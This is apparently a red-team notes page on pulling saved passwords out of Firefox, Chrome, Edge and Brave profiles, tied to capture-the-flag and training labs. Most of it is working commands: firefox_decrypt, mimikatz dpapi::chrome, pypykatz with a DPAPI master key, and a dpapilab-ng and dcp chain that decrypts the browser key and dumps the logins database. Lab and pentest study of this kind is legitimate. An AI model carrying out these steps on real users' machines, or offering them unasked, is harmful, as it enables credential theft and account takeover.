# Browser Saved Passwords

<div class="row row-cols-lg-2"><div>

#### Extract Firefox Saved Passwords

[![password_attacks](../../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![file_insecure_storage_1](../../../_badges/rootme/cryptanalysis/file_insecure_storage_1.svg)](https://www.root-me.org/en/Challenges/Cryptanalysis/File-Insecure-storage-1)

Mozilla Firefox passwords can be extracted and cracked using [firefox_decrypt](https://github.com/unode/firefox_decrypt) <small>(1.8k ⭐)</small>. To install it on Kali:

```ps
$ cd /opt
$ git clone https://github.com/unode/firefox_decrypt.git
$ cd firefox_decrypt
$ python3.9 firefox_decrypt.py -h
$ python3.9 firefox_decrypt.py /tmp/.mozilla/firefox/
```

Additional notes:

```ps
$ ls -l .mozilla/firefox/ | grep default
$ cat .mozilla/firefox/xxx.default-release/logins.json | jq.
```

#### Extract Chrome Dictionaries

[![windows_privilege_escalation](../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

Users may have added some sensitive information inside their personal browser dictionary <small>(email/username/...)</small>.

```ps
PS> ls "$Env:localappdata/Google/Chrome/User Data/Default/Custom Dictionary.txt"
```
</div><div>

#### Extract Chrome, Edge, and Brave Saved Passwords

[![chrome](../../../_badges/thm-p/chrome.svg)](https://tryhackme.com/room/chrome)

On Windows, you can find the user browser sensitive files at:

```text!
AppData\Local\Microsoft\Edge\User Data
AppData\Local\Google\Chrome\User Data
AppData\Local\BraveSoftware\Brave-Browser\User Data\
```

* **Decrypt on Windows** using [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords/) <small>(0.8k ⭐)</small>

* **Decrypt on Windows** [mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)

For the current user, you can use:

```shell!
mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

* **Decrypt on Linux** using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)

Passwords are stored [SQLite](/programming-languages/databases/relational/dbms/sqlite.md) database in `./<profile>/Login Data` such as `./Default/Login Data`. They are encrypted using a base64-encoded key in `./Local State`. You can display it using:

```ps
$ cat "./Local State" | jq | grep "encrypted_key"
"encrypted_key": "<encrypted secret key here>"
```

On Windows, the key is encrypted using [DPAPI master key](/operating-systems/windows/security/index.md#dump-credentials-protected-by-the-dpapi). Once you got it, you can decrypt the database using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md):

```shell!
$ cat mkf # master kejson file created by pypykatz
{
    "backupkeys": {},
    "masterkeys": {
        "H-I-J-K-L": "master_key_here"
    }
}
$ pypykatz dpapi chrome ./mkf "./Local State" --logindata "./Default/Login Data"
```
</div></div>

<hr class="sep-both">

## Additional Notes

<div class="row row-cols-lg-2"><div>

#### DPAPI Master Key to extract Secret Key 

Once we have the DPAPI master key, we can alternatively decrypt the encrypted secret key, and use it to decrypt the passwords.

On Linux, we can use [dpapilab-ng](https://github.com/tijldeneut/dpapilab-ng/blob/main/blobdec-with-masterkey.py) <small>(0.1k ⭐)</small> to decrypt the secret key and [dcp](https://github.com/palmenas/dcp/tree/main) <small>(0.002k ⭐)</small> to decrypt and dump passwords.

```ps
$ base64 -d > key.enc <<< "<secret key here>"
$ python -c "with open('key.enc', 'rb+') as f: data = f.read(); f.seek(0); f.write(data[5:]); f.truncate()" # remove the DPAPI text at the start of the file
$ pip install dpapick3
$ python3 blobdec-with-masterkey.py key.enc --masterkey "<master key here>"
<secret_key_here>
$ python3 dcp.py -S secret_key_here -P "./Default/Login Data"
```
</div><div>
</div></div>